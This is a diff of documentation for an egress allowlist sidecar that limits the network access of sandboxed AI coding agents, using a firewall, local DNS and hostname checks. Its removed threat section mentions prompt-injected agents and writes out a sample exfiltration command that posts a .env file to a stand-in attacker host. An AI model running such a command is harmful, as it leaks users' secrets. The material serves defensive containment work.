@@ -1,61 +1,28 @@
-# Network egress allowlist
+# Network allowlist
 
-**Off by default.** With `network = allowlist`, the agent can reach only the hostnames you list, on ports 80 and 443, and every other connection attempt is dropped and logged. Nothing in the agent container can change that.
+Network access is **unrestricted by default**. Opt-in allowlist mode restricts the agent's external connections to allowed hostnames over HTTP on port 80 and TLS on port 443. It does not inspect encrypted content or make an allowed service trustworthy.
+
+Agents remain root. The proxy's exemption is tied to its **cgroup-v2 membership**, not its uid, so changing an agent child's Unix identity does not bypass policy. Allowlist mode requires a cgroup-v2 Docker host with per-container `systemd`/`cgroupfs` isolation and the iptables cgroup matcher; disabled/shared cgroup configurations and unsupported kernels fail closed.
 
 ```sh
+sapi config set allow "@providers @github @npm"
 sapi config set network allowlist
-sapi config set allow "@providers @github @npm"      # default: @providers
-sapi                                                  # or: SAPI_NETWORK=allowlist sapi
-sapi netlog                                           # what was allowed, what was denied
+sapi
+sapi netlog                         # print available sidecar logs, then exit
 ```
 
-## Threat
+To return to unrestricted networking: `sapi config set network full`. Settings affect subsequent agent starts, not agents already running. Stop/restart an agent to apply a changed policy; its session volume is kept.
 
-The sandbox bounds what the agent can *read and write*: one directory. It does not bound what the agent can *send*. An agent that was prompt-injected by a README, that ran a malicious `postinstall`, or that is simply wrong can `curl -d @.env attacker.example`, pull a second-stage payload, or tunnel data through DNS. For untrusted code — auditing a dependency, trying a stranger's repository, reviewing a hostile PR — that is the whole risk.
-
-## Design
-
-```
-            shared network namespace  (agent: --network container:<sidecar>)
- ┌─────────────────────────────────────────────────────────────────────────────┐
- │ agent container · cap-drop ALL · no NET_ADMIN · no NET_RAW                   │
- │                                                                              │
- │   :53  any uid ≠ 65532 ──┐                                                   │
- │   :443 any uid ≠ 65532 ──┼── iptables REDIRECT ──▶ sapi-egress (uid 65532)   │
- │   :80  any uid ≠ 65532 ──┘      filter OUTPUT      ├ DNS   allowed → 198.18.0.1 │
- │   everything else ────────────── policy DROP ──▶ ✗  │       denied  → NXDOMAIN   │
- │   IPv6 ───────────────────────── policy DROP ──▶ ✗  ├ TLS   SNI  → allowlist → connect by name │
- │                                                     └ HTTP  Host → allowlist → connect by name │
- └─────────────────────────────────────────────────────────────────────────────┘
-```
-
-The sidecar is a separate container, `sapi-egress`, started *before* the agent and owning the network namespace the agent then joins. It runs one static Rust binary ([`egress/`](../egress)) that:
-
-1. **Installs the namespace firewall** (as root, `CAP_NET_ADMIN`): `filter OUTPUT` and `INPUT` policy `DROP`; loopback allowed; its own uid allowed; for every *other* uid, TCP 443 → its TLS filter, TCP 80 → its HTTP filter, UDP/TCP 53 → its resolver; `ip6tables` policy `DROP`. If any rule fails to apply, the process exits non-zero and the agent is never started.
-2. **Binds** three loopback listeners.
-3. **Drops privileges** to uid 65532 — and verifies the drop is real by trying to regain root; if that succeeds, it refuses to run.
-4. **Writes a ready marker.** `/run` is a fresh tmpfs on every start, so a restart cannot expose a stale marker; the process also removes any old marker at startup. `sapi` waits for the new file before creating/resuming the agent container. There is no window in which the agent intentionally starts without a completed firewall setup.
-5. **Answers DNS itself.** Allowed names get a fixed, non-routable answer (`198.18.0.1`); denied names get `NXDOMAIN`. The agent never performs a real DNS query, so **DNS tunnelling is closed**, and a denial is visible at the first step (`curl: Could not resolve host`).
-6. **Reads the hostname** from the TLS `ClientHello` SNI or the HTTP `Host` header (absolute-form request targets take precedence, per RFC 9112; duplicate/malformed `Host` headers are refused as smuggling vectors). No hostname — raw IP, non-TLS on 443, ECH without public SNI — means deny.
-7. **Connects by name.** The upstream address is always the proxy's own resolution of the *allowed name*, never the address the client dialled. A client cannot pair an allowed SNI with an attacker's IP. Names resolving to private, loopback, link-local, CGNAT or other non-public ranges are refused (DNS-rebinding defence).
-8. **Logs every decision** as one JSON line: `{"t":…,"ev":"allow|deny","proto":"dns|tls|http","host":…,"port":…,"reason":…,"upstream":…,"up":…,"down":…,"ms":…}`. `sapi netlog` prints them.
-
-Why not `HTTPS_PROXY`? Because it is advisory. Node's `fetch`, many CLIs, and anything malicious ignore it. Kernel redirection in a namespace the agent cannot modify is not advisory.
-
-Why not a well-known proxy with a config file? Because the policy here is one thing — "these names, these two ports" — and a small Rust binary that can only express that policy is easier to audit than a general-purpose proxy's configuration surface. There is no bypass flag in the production binary; test hooks require the `test-utils` Cargo feature and are absent from the published image.
-
-## Allowlist syntax
+## Syntax and presets
 
 | Entry | Matches |
 |---|---|
-| `api.anthropic.com` | exactly that host, on 80 and 443 |
-| `*.github.com` | any subdomain — not `github.com` itself |
-| `registry.example:443` | that host on 443 only (the only explicit ports are 80 and 443) |
-| `@providers` | preset (below) |
+| `api.anthropic.com` | Exactly that hostname on 80 and 443 |
+| `*.github.com` | Subdomains, but not `github.com` itself |
+| `registry.example:443` | That hostname on 443 only |
+| `@providers` | The provider preset below |
 
-Comma or space separated. Validated twice — by `sapi` when you set it, and by the sidecar at start. Only DNS-valid names, `*.suffix`, optional `:80`/`:443`, and known presets are accepted. Other ports are rejected because the firewall deliberately never redirects them. Wildcards are passed literally, never expanded against project filenames. A typo cannot become a hole.
-
-Presets:
+Entries are comma/space-separated. Explicit ports can only be `80` or `443`. Names and presets are validated by the launcher and sidecar; wildcards are not expanded against local filenames. Quote lists and wildcards in shell commands.
 
 | Preset | Hosts |
 |---|---|
@@ -68,37 +35,40 @@ Presets:
 | `@debian` | deb.debian.org, security.debian.org |
 | `@huggingface` | huggingface.co, \*.huggingface.co, cdn-lfs.huggingface.co |
 
-`sapi config keys` lists them; `sapi dockerfile`-style transparency applies: the expanded list is passed to the sidecar as `EGRESS_ALLOW` and visible with `docker inspect`.
+The default is `@providers` only. Presets are convenience lists, not coverage of every pi provider, login flow, redirect, or package CDN. Add the actual required hostnames; keep wildcards narrow. Policy is visible in the sidecar's `EGRESS_ALLOW` environment via `docker inspect`.
 
-## Operational notes
+## Enforcement
 
-- **pi's self-update** needs `@npm`. Without it, sapi skips the update on start (and says so) rather than let it fail noisily.
-- **SSH is not available** in allowlist mode (port 22 is dropped). Use HTTPS remotes; pass a token with `SAPI_ENV=GH_TOKEN`.
-- **Publishing ports** (`SAPI_DOCKER_ARGS=-p …`) does not work in allowlist mode: inbound is dropped and the port would have to be on the sidecar. Run dev servers in `full` mode.
-- **Resume** restarts the sidecar first and waits for the firewall before the agent's namespace comes back. If the sidecar was removed, the agent container is recreated.
-- **Changing `allow`** changes the container's network signature, so the next start recreates the pair (sessions are kept, as always).
-- The sidecar is capped at 256 MiB and 256 processes, has a read-only root filesystem plus a 1 MiB `/run` tmpfs, and runs with `cap-drop ALL` plus only `NET_ADMIN SETUID SETGID`. Its listener rules are flushed after deny policies on restart, so rules cannot accumulate.
-- The agent must not run as uid 65532: that uid belongs to the proxy and is exempt for its own upstream traffic. `sapi` refuses this collision rather than silently opening egress.
-- Production images do not contain `--no-firewall`, `--allow-private`, or `--test-upstream`; those hooks exist only in `cargo test --all-features` builds.
+The root agent shares a network namespace with a separate Rust sidecar, `NAME-egress`, but not its cgroup. It receives no `SYS_ADMIN`, `NET_ADMIN`, or `NET_RAW` capability and has a private, read-only cgroup hierarchy. Unlike an advisory `HTTPS_PROXY` variable, the namespace firewall applies even if a client ignores proxy settings.
 
-## Where the sidecar image comes from
+1. The sidecar installs default-drop firewall rules before the agent starts. Agent DNS and TCP 80/443 traffic are redirected to local listeners; other external traffic is dropped. IPv6 agent egress is blocked.
+2. DNS is answered locally, not forwarded: an allowed A query receives the synthetic address `198.18.0.1`, a denied name receives NXDOMAIN, and allowed AAAA queries receive no address.
+3. TLS SNI or the HTTP Host/request-target hostname is checked against the policy. The relay resolves and connects to that name, not to the client's chosen destination IP. Non-public upstream addresses are refused.
+4. The sidecar drops to uid 65532 and checks that it cannot regain root. It publishes readiness only after firewall/listener setup and the privilege drop; sapi waits before starting/resuming the agent.
 
-`sapi` pins `ghcr.io/sapiensmalti/sapi-egress` **by digest**, and pins the SHA-256 of the source tarball of the same tag. Both are produced by [`.github/workflows/egress-image.yml`](../.github/workflows/egress-image.yml) from [`egress/`](../egress) — built natively on amd64 and arm64 runners and merged into one manifest. Prefer not to trust the registry?
+Loopback remains available. Only sockets in the proxy's exact cgroup (or its descendants) are exempt for upstream resolution/connections. The sidecar obtains that non-root hierarchy path through `--cgroupns host`; `/` or an unavailable cgroup-v2 hierarchy is refused, with no UID fallback. The proxy still drops to uid 65532, but that uid grants no firewall exemption. The sidecar runs read-only, with a fresh 1 MiB `/run` tmpfs, a 256 MiB memory limit, and a 256-process limit. Firewall chains are reset on restart and stale readiness is removed.
 
-```sh
-SAPI_EGRESS_BUILD=1 sapi
-```
+## Logs
 
-builds the sidecar locally from the pinned, checksum-verified source tarball (a `rust:alpine` stage, ~2 minutes once). `SAPI_EGRESS_IMAGE=…` overrides the reference entirely for people who build their own.
+`sapi netlog [NAME]` prints available sidecar logs; it does not follow them. Without a name, it selects a sidecar for the current workspace. Specify the agent name when several exist. For live logs, use `docker logs --follow NAME-egress` from the host.
 
-## What it does not do
+Parsed DNS/TLS/HTTP decisions are JSON lines containing the available hostname, protocol, reason, upstream, byte counts, and timing. Successful TLS/HTTP relay records appear when the connection ends. Startup diagnostics can also appear. Headless-run sidecars are removed when the run finishes; sapi does not save a host-side network-log archive.
 
-- **Content inspection.** TLS stays end-to-end encrypted; the filter sees hostnames, not bodies. An allowed host is a channel: an agent allowed to reach `github.com` can push to a repository you did not intend. Keep the list to what the task needs, and use `read_only`-style minimal credentials.
-- **Egress filtering by IP.** Policy is by name, deliberately. Services that must be reached by raw IP are not supported.
-- **Rate or volume limits.** Bytes are counted and logged per connection, not capped.
-- **Protect the sidecar from the kernel.** It is a container like any other; for hostile code, run a VM-backed Docker.
-- **Replace credentials hygiene.** Everything the agent can read is still readable by the model provider you allow.
+**Firewall-dropped packets do not produce per-attempt JSON records.** These logs are not a complete traffic capture or an immutable audit trail.
 
-## Verifying it yourself
+## Operational limits
 
-CI checks launcher/recovery behavior in Debian 12/13 userspaces without a Docker socket. Separately, `test/smoke.sh` runs on Linux and macOS CI with real Docker: builds the sidecar, starts it, and from a container sharing its namespace proves that allowed HTTPS/HTTP are reachable, that a denied name, a non-80/443 port and a raw IP are not, that a container without `NET_ADMIN` cannot alter the rules, that restarts are ready and idempotent, that the root filesystem is read-only, and that decisions are logged. The Rust crate's own tests cover the parsers byte-by-byte, the relay's address filter, the firewall rule table, and a live relay through a fake upstream. Read [`egress/src`](../egress/src); it is short on purpose.
+- **Allowed hosts remain data channels.** TLS is end-to-end; an agent can send secrets to an allowed service. Use least-privilege credentials and only the hosts the task needs.
+- **SSH, QUIC, and arbitrary ports are unavailable.** Use HTTPS Git remotes instead of SSH. Host allowlisting does not configure Git authentication; passing `GH_TOKEN` alone does not make Git use it.
+- **Pi self-update requires the literal `@npm` preset.** Without it, sapi skips the update attempt, even if you manually listed npm's hosts. `SAPI_AUTO_UPDATE=0` also disables it.
+- **Published development-server ports are not supported** in allowlist mode. Port publishing would belong to the sidecar, and inbound traffic is filtered. Use full mode for that workflow.
+- **Some TLS clients may be refused.** A parseable hostname is required; connections without usable SNI, including some encrypted-ClientHello configurations, cannot be authorized. Raw-IP URLs without a hostname are not supported.
+- **Shells are separate behavior.** A shell joining a running agent inherits its network. A temporary `sapi shell --net` uses Docker's default network, not this allowlist. See [sessions and shells](recovery.md#sessions-and-shells).
+- **Image builds are outside this policy.** Docker pulls and build-time apt/npm downloads happen before the agent joins the filtered namespace. The allowlist is not a host-wide firewall.
+- **No bandwidth cap or container-escape guarantee.** Byte counts are logged, not limited. Docker/kernel trust remains part of the [security model](security.md).
+
+## Sidecar source and verification
+
+Release sidecars are digest-pinned; matching source archives are checksum-pinned. The release workflow kernel-tests each architecture's exact candidate image before publishing it. The launcher additionally requires the `cgroup-v2` readiness protocol so an old UID-exempt image cannot silently authorize a root agent. `SAPI_EGRESS_BUILD=1 sapi` builds from that source locally instead of pulling the image. This still requires network access for build inputs. `SAPI_EGRESS_IMAGE` is an explicit trust override. See [the release workflow](../.github/workflows/egress-image.yml) and [`egress/`](../egress).
+
+CI tests launcher/recovery behavior in Debian 12/13 userspaces without a Docker socket. Separate real Docker smoke tests on Linux and macOS exercise allowed/denied destinations, firewall permissions, restart readiness, read-only sidecar storage, and logs. Rust tests cover parsers, address filtering, firewall rules, and relays. Test-only bypass flags are excluded from the production build.
